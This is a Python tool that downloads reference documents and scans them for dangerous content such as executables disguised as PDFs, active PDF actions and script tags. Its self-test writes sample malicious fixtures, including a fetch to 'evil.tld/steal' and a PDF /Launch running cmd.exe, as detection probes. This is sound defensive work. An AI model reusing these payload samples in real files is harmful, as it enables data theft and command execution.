#!/usr/bin/env python3
"""
Shadow Army Reference Downloader & File Safety Verifier (reference_verifier.py)

Enforces the Shadow Army Research Source Policy (Points 1-8):
1. Verifies metadata (DOI/URL, venue/publisher, publication year/version, peer-review status,
   and mandatory `PREPRINT` tag for arXiv).
2. Downloads accessible reference documents locally into `<repo>/docs/references/` (or verifies
   already-downloaded files) so every cited reference is stored offline.
3. Runs a strict 7-Point File Safety & Malware/Exploit Gate on every downloaded/local file:
   - Blocks dangerous extensions (.exe, .dll, .bat, .cmd, .ps1, .vbs, .scr, .msi, .jar, .docm, .xlsm, .lnk, .iso)
   - Blocks double-extension spoofing (e.g. `paper.pdf.exe`, `spec.pdf.ps1`)
   - Verifies magic-byte file headers (`%PDF-` for `.pdf`; rejects `MZ` PE, `\x7fELF`, Mach-O, or ZIP/RAR masquerading as PDF/text)
   - Scans PDF structure for dangerous active content (`/JavaScript`, `/JS`, `/Launch`, `/EmbeddedFiles`, `/RichMedia`, `/XFA`)
   - Scans HTML/Markdown/Text files for active script injection (`<script`, `javascript:`, `<iframe`, `<object`, `<embed`, `onerror=`, `onload=`)
   - Enforces file size bounds (rejects 0-byte files or >100 MB bombs)
   - Computes SHA-256 and records verified metadata in `docs/references/references_manifest.json`
   - Discards rejected downloads from temporary staging. Local scans are read-only.
"""

from __future__ import annotations

import argparse
import contextlib
import hashlib
import http.client
import ipaddress
import json
import ntpath
import os
import re
import socket
import ssl
import stat
import sys
import tempfile
import time
import urllib.parse
import warnings
from datetime import datetime, timezone
from pathlib import Path, PureWindowsPath
from typing import Any

ALLOWED_EXTENSIONS = {".pdf", ".md", ".txt", ".json", ".yaml", ".yml", ".html", ".htm", ".csv"}

DANGEROUS_EXTENSIONS = {
    ".exe", ".dll", ".so", ".dylib", ".bat", ".cmd", ".ps1", ".vbs", ".vbe",
    ".js", ".jse", ".wsf", ".wsh", ".msc", ".scr", ".msi", ".msp", ".com",
    ".pif", ".jar", ".hta", ".cpl", ".reg", ".inf", ".lnk", ".iso", ".img",
    ".vhd", ".vhdx", ".docm", ".xlsm", ".pptm", ".dotm", ".xltm", ".sh",
}

BINARY_EXECUTABLE_MAGIC: list[tuple[str, bytes]] = [
    ("Windows PE Executable (MZ)", b"MZ"),
    ("Linux ELF Binary", b"\x7fELF"),
    ("Mach-O Binary (32-bit)", b"\xfe\xed\xfa\xce"),
    ("Mach-O Binary (64-bit)", b"\xfe\xed\xfa\xcf"),
    ("Mach-O Binary (Reverse 64-bit)", b"\xcf\xfa\xed\xfe"),
    ("Java Class / Mach-O Universal", b"\xca\xfe\xba\xbe"),
]

# PDF dictionary name tokens that trigger code execution or file launch inside PDF readers
PDF_DANGEROUS_TOKENS: list[tuple[str, re.Pattern[bytes]]] = [
    ("PDF /JavaScript action", re.compile(rb"/(?:JavaScript|JS)\b\s*(?:\(|<|<<|\d+\s+\d+\s+R)")),
    ("PDF /Launch external command", re.compile(rb"/Launch\b")),
    ("PDF /EmbeddedFiles payload", re.compile(rb"/EmbeddedFiles\b")),
    ("PDF /RichMedia Flash/media exploit", re.compile(rb"/RichMedia\b")),
    ("PDF /XFA active form script", re.compile(rb"/XFA\b")),
    ("PDF /SubmitForm or /ImportData", re.compile(rb"/(?:SubmitForm|ImportData|GoToE|GoToR)\b")),
]

TEXT_DANGEROUS_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    ("HTML <script> tag", re.compile(r"<\s*script\b", re.IGNORECASE)),
    ("HTML <iframe>/<object>/<embed>/<applet> tag", re.compile(r"<\s*(?:iframe|object|embed|applet)\b", re.IGNORECASE)),
    ("Inline event handler (onload/onerror/onclick)", re.compile(r"\bon(?:load|error|click|mouseover|focus)\s*=", re.IGNORECASE)),
    ("javascript: or vbscript: URI", re.compile(r"\b(?:javascript|vbscript|data:text/html)\s*:", re.IGNORECASE)),
]

MAX_FILE_BYTES = 100 * 1024 * 1024  # 100 MB
DOWNLOAD_TIMEOUT_SECONDS = 30
MAX_REDIRECTS = 5
READ_CHUNK_BYTES = 64 * 1024
MANIFEST_NAME = "references_manifest.json"


def _is_link(metadata: os.stat_result) -> bool:
    return stat.S_ISLNK(metadata.st_mode) or bool(
        getattr(metadata, "st_file_attributes", 0) & stat.FILE_ATTRIBUTE_REPARSE_POINT
    )


def _checked_stat(path: Path) -> os.stat_result:
    if path.drive.startswith("\\\\"):
        raise ValueError("Network and device paths are not allowed for local references.")
    for component in (*reversed(path.parents), path):
        metadata = component.lstat()
        if _is_link(metadata):
            raise ValueError(f"Links and reparse points are not allowed: {component}")
    return metadata


def _read_reference(path: Path, metadata: os.stat_result) -> bytes:
    if metadata.st_size > MAX_FILE_BYTES:
        raise ValueError("Reference file exceeds the size limit.")
    flags = os.O_RDONLY | getattr(os, "O_BINARY", 0) | getattr(os, "O_NOFOLLOW", 0) | getattr(os, "O_NONBLOCK", 0)
    with os.fdopen(os.open(path, flags), "rb") as source:
        opened = os.fstat(source.fileno())
        if (not stat.S_ISREG(opened.st_mode) or not os.path.samestat(metadata, opened)
                or (opened.st_size, opened.st_mtime_ns) != (metadata.st_size, metadata.st_mtime_ns)):
            raise ValueError("File changed before it could be read.")
        content = source.read(MAX_FILE_BYTES + 1)
        after = _checked_stat(path)
        if (len(content) != metadata.st_size or not os.path.samestat(opened, after)
                or (after.st_size, after.st_mtime_ns) != (opened.st_size, opened.st_mtime_ns)):
            raise ValueError("File changed while it was being read.")
        return content


def check_double_extension(filename: str) -> str | None:
    parts = Path(filename).name.lower().split(".")
    if len(parts) <= 2:
        return None
    for part in parts[1:-1]:
        if f".{part}" in DANGEROUS_EXTENSIONS:
            return f"Double extension contains dangerous inner suffix '.{part}' in '{filename}'"
    if f".{parts[-1]}" in DANGEROUS_EXTENSIONS:
        return f"Double extension ends with dangerous suffix '.{parts[-1]}' in '{filename}'"
    return None


def verify_file_safety(file_path: Path, quarantine_delete: bool = False) -> dict[str, Any]:
    """Inspect a local file without modifying it."""
    if quarantine_delete:
        warnings.warn("quarantine_delete is deprecated. Local scans are read-only.", DeprecationWarning, stacklevel=2)
    path = file_path.absolute()
    reasons: list[str] = []

    try:
        metadata = _checked_stat(path)
        if not stat.S_ISREG(metadata.st_mode):
            raise ValueError("Path is not a regular file.")
        raw_bytes = _read_reference(path, metadata) if 0 < metadata.st_size <= MAX_FILE_BYTES else b""
    except (OSError, ValueError) as exc:
        return {
            "file": str(path),
            "safe": False,
            "status": "FILE_NOT_FOUND" if isinstance(exc, FileNotFoundError) else "FILE_UNREADABLE",
            "reasons": [str(exc)],
            "quarantine_action": "NONE",
        }

    ext = path.suffix.lower()
    double_ext_err = check_double_extension(path.name)
    if double_ext_err:
        reasons.append(double_ext_err)

    if ext in DANGEROUS_EXTENSIONS:
        reasons.append(f"Blocked dangerous file extension '{ext}'")
    elif ext not in ALLOWED_EXTENSIONS:
        reasons.append(f"Extension '{ext}' is not in allowed reference formats ({sorted(ALLOWED_EXTENSIONS)})")

    size_bytes = metadata.st_size
    if size_bytes == 0:
        reasons.append("File is empty (0 bytes)")
    elif size_bytes > MAX_FILE_BYTES:
        reasons.append(f"File size ({size_bytes} bytes) exceeds 100 MB safety ceiling")

    # Check 3: Binary executable magic bytes masquerading as a reference document
    for label, magic in BINARY_EXECUTABLE_MAGIC:
        if raw_bytes.startswith(magic):
            reasons.append(f"Binary executable header detected ({label}) inside '{path.name}'")

    if raw_bytes.startswith(b"PK\x03\x04"):
        reasons.append(f"ZIP/Office archive header (PK) disguised as '{ext}' in '{path.name}'")

    # Check 4: Format-specific inspection
    if ext == ".pdf" and raw_bytes:
        # Must begin with %PDF- within first 1024 bytes (per PDF spec)
        if b"%PDF-" not in raw_bytes[:1024]:
            reasons.append("Invalid PDF header: missing '%PDF-' signature in first 1024 bytes")
        for label, pattern in PDF_DANGEROUS_TOKENS:
            if pattern.search(raw_bytes):
                reasons.append(f"Dangerous active PDF object detected: {label}")

    elif ext in {".md", ".txt", ".json", ".yaml", ".yml", ".csv", ".html", ".htm"} and raw_bytes:
        if b"\x00" in raw_bytes[:4096]:
            reasons.append(f"Null bytes (binary payload) found inside text reference '{path.name}'")
        text_content = raw_bytes.decode("utf-8", errors="replace")
        # For Markdown, ignore fenced code blocks when checking HTML tags unless it's .html/.htm
        inspect_text = text_content
        if ext == ".md":
            inspect_text = re.sub(r"```[\s\S]*?```", "", text_content)
        for label, pattern in TEXT_DANGEROUS_PATTERNS:
            if pattern.search(inspect_text):
                reasons.append(f"Active script/injection pattern detected in text/HTML: {label}")

    sha256_hex = hashlib.sha256(raw_bytes).hexdigest() if raw_bytes else ""
    safe = len(reasons) == 0
    return {
        "file": str(path),
        "filename": path.name,
        "size_bytes": size_bytes,
        "sha256": sha256_hex,
        "safe": safe,
        "status": "SAFE" if safe else "DANGEROUS_FILE_BLOCKED",
        "reasons": reasons,
        "quarantine_action": "NONE",
    }


SOURCE_RECORD_FIELDS = ("owner", "effective_version", "accessed_at", "digest", "revalidation_trigger")
SHA256_RE = re.compile(r"^[0-9a-f]{64}$")


def evaluate_source_freshness(record: object, now: datetime, max_age_days: int = 365) -> dict[str, Any]:
    """Classify a dated source record as VERIFIED_ARCHIVED, STALE, UNKNOWN_METADATA or INVALID_INPUT.

    Every field must be a non-blank string, `accessed_at` a timezone-aware ISO-8601 time that is not
    in the future, and `digest` a lowercase SHA-256 of the archived file.
    """
    if not isinstance(record, dict):
        return {"status": "INVALID_INPUT", "missing": list(SOURCE_RECORD_FIELDS), "stale": True}
    missing = [key for key in SOURCE_RECORD_FIELDS if not (isinstance(record.get(key), str) and record[key].strip())]
    if missing:
        return {"status": "UNKNOWN_METADATA", "missing": missing, "stale": True}
    try:
        accessed = datetime.fromisoformat(record["accessed_at"].replace("Z", "+00:00"))
    except ValueError:
        return {"status": "INVALID_INPUT", "missing": ["accessed_at"], "stale": True}
    if accessed.tzinfo is None or accessed > now or not SHA256_RE.match(record["digest"]):
        return {"status": "INVALID_INPUT", "missing": [], "stale": True}
    stale = (now - accessed).days > max_age_days
    return {"status": "STALE" if stale else "VERIFIED_ARCHIVED", "missing": [], "stale": stale}


def classify_source_metadata(
    title: str,
    doi_or_url: str,
    venue: str,
    year: str,
    peer_reviewed: bool | None = None,
) -> dict[str, Any]:
    """Record publisher metadata; an unspecified peer review status stays unknown."""
    parsed = urllib.parse.urlparse(doi_or_url)
    is_arxiv = (parsed.hostname in {"arxiv.org", "www.arxiv.org"}
                or doi_or_url.lower().startswith("10.48550/arxiv.")
                or venue.strip().lower() == "arxiv")
    if is_arxiv and peer_reviewed is not True:
        source_type = "PREPRINT"
        peer_reviewed = False
    elif peer_reviewed is True:
        source_type = "PEER_REVIEWED"
    else:
        source_type = "UNCLASSIFIED"
    badge = "[" + source_type.replace("_", "-") + "]"

    return {
        "title": title,
        "doi_or_url": doi_or_url,
        "venue": venue,
        "year": year,
        "source_type": source_type,
        "peer_reviewed": peer_reviewed,
        "citation_badge": badge,
    }


def _public_https_url(url: str) -> urllib.parse.SplitResult:
    if any(ord(char) <= 32 or ord(char) == 127 for char in url):
        raise ValueError("URL contains whitespace or control characters.")
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme != "https" or not parsed.hostname or parsed.username is not None:
        raise ValueError("Public reference URLs must use HTTPS without URL credentials.")
    if "%" in parsed.hostname or "\\" in parsed.netloc or parsed.port == 0:
        raise ValueError("Invalid host or port in reference URL.")
    return parsed


def _is_public_address(address: str) -> bool:
    ip = ipaddress.ip_address(address)
    if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped is not None:
        ip = ip.ipv4_mapped
    return ip.is_global and not ip.is_multicast and not ip.is_reserved


class _PublicHTTPSConnection(http.client.HTTPSConnection):
    def __init__(self, host: str, *, port: int | None = None, timeout: float, context: ssl.SSLContext) -> None:
        super().__init__(host, port=port, timeout=timeout, context=context)
        self.tls_context = context

    def connect(self) -> None:
        addresses = socket.getaddrinfo(self.host, self.port, type=socket.SOCK_STREAM)
        if not addresses or any(not _is_public_address(addr[4][0]) for addr in addresses):
            raise ValueError("Reference host must resolve exclusively to public addresses.")

        last_error = None
        deadline = time.monotonic() + self.timeout
        for family, kind, protocol, _, address in addresses:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError("Reference connection timed out.")
            sock = socket.socket(family, kind, protocol)
            try:
                sock.settimeout(remaining)
                sock.connect(address)
                self.sock = self.tls_context.wrap_socket(sock, server_hostname=self.host)
                return
            except OSError as exc:
                sock.close()
                last_error = exc
        raise OSError("Could not establish a verified connection to the reference host.") from last_error


def _save_response(response: http.client.HTTPResponse, candidate: Path, deadline: float) -> None:
    with candidate.open("xb") as output:
        expected_length = response.getheader("Content-Length")
        length = int(expected_length) if expected_length is not None else None
        if length is not None and not 0 <= length <= MAX_FILE_BYTES:
            raise ValueError("Reference download exceeds the allowed size limit.")
        size = 0
        while True:
            if time.monotonic() >= deadline:
                raise TimeoutError("Reference download timed out.")
            chunk = response.read1(min(READ_CHUNK_BYTES, MAX_FILE_BYTES - size + 1))
            if not chunk:
                break
            size += len(chunk)
            if size > MAX_FILE_BYTES:
                raise ValueError("Reference download exceeds the allowed size limit.")
            output.write(chunk)
        if length is not None and size != length:
            raise ValueError("Incomplete reference download.")


def _download_to_stage(url: str, candidate: Path) -> str:
    context = ssl.create_default_context()
    deadline = time.monotonic() + DOWNLOAD_TIMEOUT_SECONDS
    for _ in range(MAX_REDIRECTS + 1):
        parsed = _public_https_url(url)
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError("Reference download timed out.")
        path = urllib.parse.quote(parsed.path or "/", safe="!$&'()*+,;=:@/-._~%")
        query = urllib.parse.quote(parsed.query, safe="!$&'()*+,;=:@/-._~%?")
        request_target = urllib.parse.urlunsplit(("", "", path, query, ""))
        connection = _PublicHTTPSConnection(parsed.hostname, port=parsed.port, timeout=remaining, context=context)
        with contextlib.closing(connection):
            connection.request("GET", request_target, headers={
                "User-Agent": "ShadowArmy-ReferenceVerifier/1.0 (+https://github.com/RidhuanDEV/claude-skills)",
                "Accept-Encoding": "identity",
                "Connection": "close",
            })
            with connection.getresponse() as response:
                if response.status in (301, 302, 303, 307, 308):
                    location = response.getheader("Location")
                    if not location:
                        raise ValueError("Reference redirect has no destination.")
                    url = urllib.parse.urljoin(url, location)
                    continue
                if response.status != 200 or response.getheader("Content-Range") is not None:
                    raise ValueError(f"Reference server did not return a complete HTTP 200 response ({response.status}).")
                if (response.getheader("Content-Encoding") or "identity").lower() != "identity":
                    raise ValueError("Unsupported content encoding for reference download.")
                _save_response(response, candidate, deadline)
                return parsed._replace(query="", fragment="").geturl()
    raise ValueError("Reference download exceeded the redirect limit.")


def _prepare_archive(dest_dir: Path) -> Path:
    root = dest_dir.absolute()
    if root.drive.startswith("\\\\"):
        raise ValueError("Network and device paths are not allowed for local references.")
    for directory in (*reversed(root.parents), root):
        try:
            metadata = directory.lstat()
        except FileNotFoundError:
            directory.mkdir(exist_ok=True)
            metadata = directory.lstat()
        if _is_link(metadata) or not stat.S_ISDIR(metadata.st_mode):
            raise ValueError(f"Unsafe archive directory: {directory}")
    return root


def _existing_archive_file(path: Path) -> os.stat_result | None:
    try:
        metadata = _checked_stat(path)
    except FileNotFoundError:
        return None
    if not stat.S_ISREG(metadata.st_mode):
        raise ValueError(f"Archive path is not a regular file: {path}")
    return metadata


def _publish_reference(candidate: Path, target: Path, record: dict[str, Any]) -> None:
    manifest_path = target.parent / MANIFEST_NAME
    lock = target.parent / ".reference-manifest.lock"
    with lock.open("xb"):
        pass
    try:
        previous = _existing_archive_file(target)
        manifest_metadata = _existing_archive_file(manifest_path)
        manifest: dict[str, Any] = {"references": []}
        if manifest_metadata is not None:
            manifest = json.loads(_read_reference(manifest_path, manifest_metadata).decode("utf-8-sig"))
        if not isinstance(manifest.get("references"), list):
            raise ValueError("Existing manifest has no references list.")

        def archived_name(entry: dict[str, Any]) -> str:
            artifact = entry.get("archive") or entry.get("safety") or {}
            return os.path.normcase(artifact.get("filename") or artifact.get("file") or "")

        manifest["references"] = [
            entry for entry in manifest["references"] if archived_name(entry) != os.path.normcase(target.name)
        ]
        manifest["references"].append(record)
        receipt = candidate.parent / "manifest.tmp"
        receipt.write_text(json.dumps(manifest, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")

        backup = candidate.parent / "previous"
        if previous is not None:
            target.replace(backup)
        installed = False
        try:
            candidate.replace(target)
            installed = True
            receipt.replace(manifest_path)
        except BaseException:
            if previous is not None:
                backup.replace(target)
            elif installed:
                target.unlink()
            raise
    finally:
        lock.unlink()


def download_and_verify_reference(
    url: str,
    dest_dir: Path,
    title: str,
    venue: str,
    year: str,
    doi: str = "",
    peer_reviewed: bool | None = None,
    filename: str | None = None,
    expected_sha256: str | None = None,
) -> dict[str, Any]:
    """Stage a public HTTPS reference and publish it after local safety and integrity checks."""
    parsed = _public_https_url(url)
    if expected_sha256 is not None:
        if len(expected_sha256) != 64 or any(char not in "0123456789abcdefABCDEF" for char in expected_sha256):
            raise ValueError("Expected SHA-256 must contain 64 hexadecimal characters.")
        expected_sha256 = expected_sha256.lower()

    inferred_name = filename or Path(parsed.path).name or "reference.pdf"
    if "." not in inferred_name:
        inferred_name += ".pdf"
    safe_name = re.sub(r"[^A-Za-z0-9._-]", "_", inferred_name)
    is_reserved = getattr(ntpath, "isreserved", lambda name: PureWindowsPath(name).is_reserved())
    if safe_name.endswith(".") or safe_name.lower() in {"manifest.tmp", MANIFEST_NAME} or is_reserved(safe_name):
        raise ValueError("Reserved archive filename.")
    dest_dir = _prepare_archive(dest_dir)
    target_path = dest_dir / safe_name

    with tempfile.TemporaryDirectory(prefix=".reference-fetch-", dir=dest_dir) as staging:
        candidate = Path(staging) / safe_name
        final_url = _download_to_stage(url, candidate)
        safety = verify_file_safety(candidate)
        if expected_sha256 is not None and safety.get("sha256") != expected_sha256:
            safety["safe"] = False
            safety["status"] = "INTEGRITY_MISMATCH"
            safety["reasons"].append("Downloaded bytes do not match the expected SHA-256.")
        safety["file"] = str(target_path) if safety["safe"] else safe_name
        if not safety["safe"]:
            safety["quarantine_action"] = "DISCARDED_STAGING_FILE"

        recorded_url = parsed._replace(query="", fragment="").geturl()
        meta = classify_source_metadata(title=title, doi_or_url=doi or recorded_url, venue=venue, year=year, peer_reviewed=peer_reviewed)

        record = {
            **meta,
            "download_url": recorded_url,
            "final_url": final_url,
            "expected_sha256": expected_sha256,
            "verified_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "safety": safety,
        }

        if safety["safe"]:
            _publish_reference(candidate, target_path, record)
    return record


def run_self_test() -> dict[str, Any]:
    """Execute Precision & Recall probes on the 7-Point File Safety & Source Policy Verifier (Rigor Protocol Rule 22)."""
    probes: list[dict[str, Any]] = []

    def add_probe(name: str, passed: bool, detail: str) -> None:
        probes.append({"probe": name, "passed": passed, "detail": detail})

    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp).resolve()

        # --- PRECISION PROBES (5 realistic safe inputs that MUST pass as SAFE) ---
        p1 = root / "iso_29148_excerpt.pdf"
        p1.write_bytes(b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n%%EOF\n")
        r1 = verify_file_safety(p1)
        add_probe("PRECISION-1: Clean standard PDF (`%PDF-1.7`) passes and stays on disk", r1["safe"] and p1.exists(), json.dumps(r1["reasons"]))

        p2 = root / "pdf_mentioning_javascript_in_prose.pdf"
        p2.write_bytes(b"%PDF-1.5\nstream\nThis paper compares Python and JavaScript AST parsers.\nendstream\n%%EOF\n")
        r2 = verify_file_safety(p2)
        add_probe("PRECISION-2: PDF mentioning the English word 'JavaScript' in body prose (not `/JavaScript` token) is NOT false-flagged", r2["safe"] and p2.exists(), json.dumps(r2["reasons"]))

        p3 = root / "nist_ssdf_notes.md"
        p3.write_text(
            "# NIST SSDF SP 800-218 Summary\n\n"
            "Example blocked snippet in fenced code block:\n"
            "```html\n<script>alert(1)</script>\n```\n",
            encoding="utf-8",
        )
        r3 = verify_file_safety(p3)
        add_probe("PRECISION-3: Markdown note with fenced code block example passes as SAFE", r3["safe"] and p3.exists(), json.dumps(r3["reasons"]))

        p4 = root / "rfc9110_http.txt"
        p4.write_text("RFC 9110: HTTP Semantics. Status 200 OK.\n", encoding="utf-8")
        r4 = verify_file_safety(p4)
        add_probe("PRECISION-4: Clean plain-text RFC specification passes as SAFE", r4["safe"] and p4.exists(), json.dumps(r4["reasons"]))

        p5_meta = classify_source_metadata(
            title="Attention Is All You Need",
            doi_or_url="https://arxiv.org/abs/1706.03762",
            venue="arXiv",
            year="2017",
            peer_reviewed=False,
        )
        add_probe(
            "PRECISION-5: arXiv source without peer-reviewed venue is automatically tagged `PREPRINT` (`[PREPRINT]`)",
            p5_meta["source_type"] == "PREPRINT" and not p5_meta["peer_reviewed"] and p5_meta["citation_badge"] == "[PREPRINT]",
            json.dumps(p5_meta),
        )

        # --- RECALL PROBES (5 dangerous inputs that MUST be blocked without deleting the source) ---
        rc1 = root / "disguised_malware.pdf"
        rc1.write_bytes(b"MZ\x90\x00\x03\x00\x00\x00Fake Windows EXE disguised as PDF")
        rr1 = verify_file_safety(rc1)
        add_probe(
            "RECALL-1: Windows PE executable (`MZ`) disguised as `.pdf` is blocked and preserved for review",
            not rr1["safe"] and rc1.exists() and rr1["quarantine_action"] == "NONE",
            json.dumps(rr1["reasons"]),
        )

        rc2 = root / "paper.pdf.exe"
        rc2.write_bytes(b"MZ\x90\x00")
        rr2 = verify_file_safety(rc2)
        add_probe(
            "RECALL-2: Double-extension spoof (`paper.pdf.exe`) is blocked and preserved for review",
            not rr2["safe"] and rc2.exists(),
            json.dumps(rr2["reasons"]),
        )

        rc3 = root / "exploit_js.pdf"
        rc3.write_bytes(b"%PDF-1.7\n1 0 obj\n<< /Type /Action /S /JavaScript /JS (app.launchURL('http://evil.tld')) >>\nendobj\n%%EOF\n")
        rr3 = verify_file_safety(rc3)
        add_probe(
            "RECALL-3: PDF with embedded `/JavaScript` / `/JS` execution object is blocked and preserved for review",
            not rr3["safe"] and rc3.exists(),
            json.dumps(rr3["reasons"]),
        )

        rc4 = root / "exploit_launch.pdf"
        rc4.write_bytes(b"%PDF-1.7\n1 0 obj\n<< /Type /Action /S /Launch /Win << /F (cmd.exe) >> >>\nendobj\n%%EOF\n")
        rr4 = verify_file_safety(rc4)
        add_probe(
            "RECALL-4: PDF with `/Launch` command execution action is blocked and preserved for review",
            not rr4["safe"] and rc4.exists(),
            json.dumps(rr4["reasons"]),
        )

        rc5 = root / "phishing_reference.html"
        rc5.write_text("<html><body><script>fetch('http://evil.tld/steal')</script></body></html>", encoding="utf-8")
        rr5 = verify_file_safety(rc5)
        add_probe(
            "RECALL-5: HTML reference containing active `<script>` payload is blocked and preserved for review",
            not rr5["safe"] and rc5.exists(),
            json.dumps(rr5["reasons"]),
        )

    all_passed = all(p["passed"] for p in probes)
    return {
        "suite": "reference_verifier.py 7-Point File Safety & Source Policy Self-Test",
        "total_probes": len(probes),
        "passed": sum(1 for p in probes if p["passed"]),
        "failed": sum(1 for p in probes if not p["passed"]),
        "all_passed": all_passed,
        "results": probes,
    }


def assess_reference(manifest_path: Path, filename: str, expected_version: str) -> dict:
    """Check a pinned offline reference for one consumer version, without fetching or modifying it."""
    if not filename or Path(filename).name != filename or not expected_version.strip():
        raise ValueError("A plain archive filename and consumer version are required.")
    manifest_path = manifest_path.absolute()
    manifest_metadata = _existing_archive_file(manifest_path)
    if manifest_metadata is None:
        return {"status": "UNKNOWN", "reason": "Local source manifest is unavailable."}
    data = json.loads(_read_reference(manifest_path, manifest_metadata).decode("utf-8-sig"))
    matches = []
    for record in data["references"]:
        artifact = record.get("archive") or record.get("safety") or {}
        if (artifact.get("filename") or artifact.get("file")) == filename:
            matches.append((record, artifact))
    if len(matches) != 1:
        return {"status": "UNKNOWN", "reason": "Missing or ambiguous source record."}
    record, artifact = matches[0]
    path = manifest_path.parent / filename
    if path.parent != manifest_path.parent or _existing_archive_file(path) is None:
        return {"status": "UNKNOWN", "reason": "Local source unavailable or outside the archive."}
    checked = verify_file_safety(path)
    if not checked["safe"] or checked["sha256"] != artifact.get("sha256"):
        return {"status": "BLOCKED", "reason": "Archive integrity or safety mismatch."}
    version = record.get("version") or record.get("year")
    if not version or str(version) != expected_version:
        return {"status": "REVIEW_VERSION", "archived_version": version, "requested_version": expected_version}
    return {"status": "PIN_MATCH", "source": record.get("download_url") or record.get("source"),
            "version": version, "sha256": checked["sha256"], "verified_at": record.get("verified_at"),
            "limitations": "Local pin matched; upstream freshness has not been checked."}


def scan_local_references(target: Path) -> dict[str, Any]:
    target = target.absolute()
    paths = [target]
    results: list[dict[str, Any]] = []
    while paths:
        path = paths.pop()
        try:
            if stat.S_ISDIR(_checked_stat(path).st_mode):
                paths.extend(sorted((child for child in path.iterdir() if child.name != MANIFEST_NAME), reverse=True))
                continue
        except (OSError, ValueError) as exc:
            results.append({"file": str(path), "safe": False, "status": "FILE_UNREADABLE", "reasons": [str(exc)],
                            "quarantine_action": "NONE"})
            continue
        results.append(verify_file_safety(path))
    return {
        "target": str(target),
        "checked_count": len(results),
        "all_safe": bool(results) and all(result["safe"] for result in results),
        "results": results,
        "status": "NO_FILES" if not results else "SCANNED",
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="Shadow Army Reference Downloader & 7-Point File Safety Verifier")
    parser.add_argument("--self-test", action="store_true", help="Run precision & recall probes on the file safety verifier")
    sub = parser.add_subparsers(dest="cmd")

    p_scan = sub.add_parser("scan", help="Scan a local reference file or directory for dangerous content")
    p_scan.add_argument("target", help="File or directory path to scan")
    p_scan.add_argument("--quarantine-delete", action="store_true", help="Deprecated compatibility flag. Scans are read-only.")

    p_fetch = sub.add_parser("fetch", help="Download a reference URL to local PC, verify safety, and record in references_manifest.json")
    p_fetch.add_argument("--url", required=True, help="HTTPS URL of the reference document (PDF/MD/TXT/HTML)")
    p_fetch.add_argument("--dest-dir", default="docs/references", help="Local directory to store verified references")
    p_fetch.add_argument("--title", required=True, help="Reference title")
    p_fetch.add_argument("--venue", required=True, help="Publisher, standard body, or venue (e.g. IEEE, ISO, NIST, OWASP, arXiv)")
    p_fetch.add_argument("--year", required=True, help="Publication year or standard version")
    p_fetch.add_argument("--doi", default="", help="DOI or standard identifier")
    p_fetch.add_argument("--peer-reviewed", choices=["true", "false"], default=None, help="Explicit peer-review status")
    p_fetch.add_argument("--filename", default=None, help="Optional local filename")
    p_fetch.add_argument("--expected-sha256", default=None, help="Trusted SHA-256 checksum for the downloaded bytes")

    assess = sub.add_parser("assess", help="Check an archived reference against a pinned consumer version")
    assess.add_argument("manifest", type=Path)
    assess.add_argument("filename")
    assess.add_argument("--version", required=True)

    args = parser.parse_args()

    if args.self_test:
        summary = run_self_test()
        print(json.dumps(summary, indent=2, ensure_ascii=False))
        return 0 if summary["all_passed"] else 1

    if args.cmd == "assess":
        try:
            result = assess_reference(args.manifest, args.filename, args.version)
        except (OSError, ValueError, KeyError, TypeError, AttributeError) as error:
            result = {"status": "UNKNOWN", "reason": str(error)}
        print(json.dumps(result, indent=2))
        return 0 if result["status"] == "PIN_MATCH" else 1

    if args.cmd == "scan":
        if args.quarantine_delete:
            print("--quarantine-delete is deprecated. Local scans are read-only.", file=sys.stderr)
        result = scan_local_references(Path(args.target))
        print(json.dumps(result, indent=2, ensure_ascii=False))
        return 0 if result["all_safe"] else 1

    if args.cmd == "fetch":
        pr = None if args.peer_reviewed is None else (args.peer_reviewed == "true")
        try:
            res = download_and_verify_reference(
                url=args.url,
                dest_dir=Path(args.dest_dir),
                title=args.title,
                venue=args.venue,
                year=args.year,
                doi=args.doi,
                peer_reviewed=pr,
                filename=args.filename,
                expected_sha256=args.expected_sha256,
            )
        except (OSError, ValueError, http.client.HTTPException) as exc:
            res = {"safety": {"safe": False, "status": "FETCH_FAILED", "reasons": [str(exc)]}}
        print(json.dumps(res, indent=2, ensure_ascii=False))
        return 0 if res["safety"]["safe"] else 1

    parser.print_help()
    return 0


if __name__ == "__main__":
    sys.exit(main())
